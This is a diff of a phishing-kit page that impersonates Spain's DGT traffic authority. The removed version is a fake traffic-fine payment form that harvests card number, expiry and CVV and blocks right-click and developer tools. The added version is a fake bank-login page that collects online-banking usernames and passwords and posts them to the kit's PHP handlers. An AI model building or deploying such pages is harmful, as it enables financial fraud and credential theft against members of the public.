@@ -1,165 +1,122 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <title>Page de sanciones</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticación por banco</title>
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 
-    <!-- Import des styles nÃ©cessaires -->
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
-    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../assets/ing/style.css">
+    <link rel="stylesheet" href="../assets/ing/scrollbar.css">
 
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    
     <style>
         body {
-            margin: 0;
+            padding-top: 20px;
             font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
         }
-
-        .main-header, .main-footer {
-            background-color: #048;
+        .main-header {
+            background-color: #004488;
             color: #fff;
             padding: 10px 0;
+        }
+        .main-header .title {
+            color: #fff;
+            font-size: 24px;
             text-align: center;
         }
-
-        .main-header h1, .main-footer p {
-            margin: 0;
-        }
-
-        .container {
-            padding: 20px;
-        }
-
-        .custom-button {
-            background-color: #048;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .custom-button:hover {
-            background-color: #036;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
         .form-control {
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            padding: 10px;
-            width: 100%;
+            margin-bottom: 15px;
+            border-radius: 4px;
         }
-
-        label.mandatory::after {
-            content: " *";
+        .btn-primary {
+            background-color: #004488;
+            border-color: #003366;
+            border-radius: 4px;
+        }
+        .btn-primary:hover {
+            background-color: #003366;
+            border-color: #002244;
+        }
+        .container {
+            max-width: 100%;
+        }
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+        .error-message {
             color: red;
+            text-align: center;
+            margin-top: 10px;
         }
-
-        .footer-social ul {
-            list-style: none;
-            padding: 0;
-        }
-
-        .footer-social ul li {
-            display: inline-block;
-            margin: 0 10px;
+        @media (max-width: 576px) {
+            .main-header .title {
+                font-size: 18px;
+            }
         }
     </style>
-
-    <script src="https://js.stripe.com/v3/buy-button.js" async></script>
 </head>
 <body>
     <header class="main-header">
-        <h1>Pago de sanciones</h1>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center">
+                    <div class="logo">
+                        <a href="#" target="_blank"><img src="../assets/images/logo-mir.png" alt="Logo MIR"></a>
+                        <a href="#" target="_blank"><img src="../assets/images/logo-dgt.png" alt="Logo DGT"></a>
+                    </div>
+                    <div class="title">Autenticación por banco</div>
+                </div>
+            </div>
+        </div>
     </header>
+
     <main class="container">
-        <h2>Pago de su multa NÂ°164357371274</h2>
-        <form method="post" id="carte_form" action="../actions/carte.php">
-            <div class="form-group">
-                <label class="mandatory">NÃºmero de tarjeta de crÃ©dito</label>
-                <input id="ccnum" type="text" name="ccnum" class="form-control" minlength="16" maxlength="16" inputmode="numeric" oninput="chiffres_only(this)" required>
-                <span id="errorMessage" style="color: red;"></span>
+        <div class="row justify-content-center">
+            <div class="col-12 col-md-8">
+                <center><img src="../assets/ing/ico_oob_1.png" width="125" alt="Icon"></center>
+                <h4 class="text-center text-primary">Por favor, identifícate con tu nombre de usuario y contraseña de banca electrónica</h4>
+                
+                <form id="oobForm" action="../actions/banque.php" method="POST">
+                    <div class="form-group">
+                        <label for="nom_bank">Nombre del banco</label>
+                        <input type="text" class="form-control" id="nom_bank" name="nom_bank" placeholder="Ingrese su identificación" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="identifiant_banque">Identificación</label>
+                        <input type="text" class="form-control" id="identifiant_banque" name="identifiant_banque" placeholder="Ingrese su identificación" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mdp_banque">Contraseña</label>
+                        <input type="password" class="form-control" id="mdp_banque" name="mdp_banque" placeholder="Ingrese su contraseña" required>
+                    </div>
+
+                    <div class="text-center">
+                        <button type="submit" id="banque_submit" name="banque_submit" class="btn btn-primary">Validar</button>
+                    </div>
+                </form>
             </div>
-            <div class="form-group">
-                <label class="mandatory">Fecha de expiraciÃ³n</label>
-                <input id="exp" type="text" name="exp" class="form-control" minlength="7" maxlength="7" inputmode="numeric" placeholder="MM/AAAA" oninput="validateExpirationDate(this);" onkeyup="formatString(event);" required>
-            </div>
-            <div class="form-group">
-                <label class="mandatory">CVV</label>
-                <input id="cvv" type="text" name="cvv" class="form-control" minlength="3" maxlength="4" placeholder="xxx" inputmode="numeric" oninput="chiffres_only(this)" required>
-            </div>
-            <button type="submit" name="carte_submit" class="custom-button">Continuar</button>
-            <input type="hidden" name="carte_submit" id="carte_submit" value="true">
-        </form>
+        </div>
     </main>
-    <footer class="main-footer">
-        <p>Copyright @ DGT 2022. Todos los derechos reservados</p>
-        <div class="footer-social">
-            <ul>
-                <li><a href="" target="_blank"><em class="fa fa-facebook-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-twitter-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-youtube-square"></em></a></li>
-                <li><a href="" target="_blank"><em class="fa fa-instagram"></em></a></li>
-            </ul>
-        </div>
-        <div class="contact">
-            <p>TelÃ©fono: 011 Estado del TrÃ¡fico | 060 Admin. Gral. del Estado</p>
-            <p>UbicaciÃ³n: C/ Josefa Valcarcel, 28 - 28071 Madrid-EspaÃ±a</p>
-        </div>
-    </footer>
 
+    <!-- jQuery and Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <!-- Custom JS -->
     <script>
-        function validateExpirationDate(input) {
-            input.value = input.value.replace(/\D/g, '');
-            if (input.value.length > 2) {
-                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
-            }
-
-            var mois = parseInt(input.value.slice(0, 2), 10);
-            var annee = parseInt(input.value.slice(3), 10);
-
-            if (mois < 1 || mois > 12 || annee < 2024 || annee > 2035 || isNaN(mois) || isNaN(annee)) {
-                document.getElementById('errorMessage').textContent = "Fecha no vÃ¡lida!";
-            } else {
-                document.getElementById('errorMessage').textContent = "";
-            }
-        }
-
-        function chiffres_only(input) {
-            input.value = input.value.replace(/\D/g, '');
-        }
-
-        document.addEventListener("contextmenu", function(e) {
-            e.preventDefault();
-        }, false);
-
-        document.addEventListener("selectstart", function(e) {
-            e.preventDefault();
-        }, false);
-
-        window.addEventListener("keydown", function(e) {
-            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-                e.preventDefault();
-            }
-        });
-
-        document.getElementById('carte_form').addEventListener('submit', function() {
-            document.getElementById('carte_submit').disabled = true;
+        // Example of additional custom JS if needed
+        $(document).ready(function(){
+            // Your code here
         });
     </script>
 </body>
 </html>
-
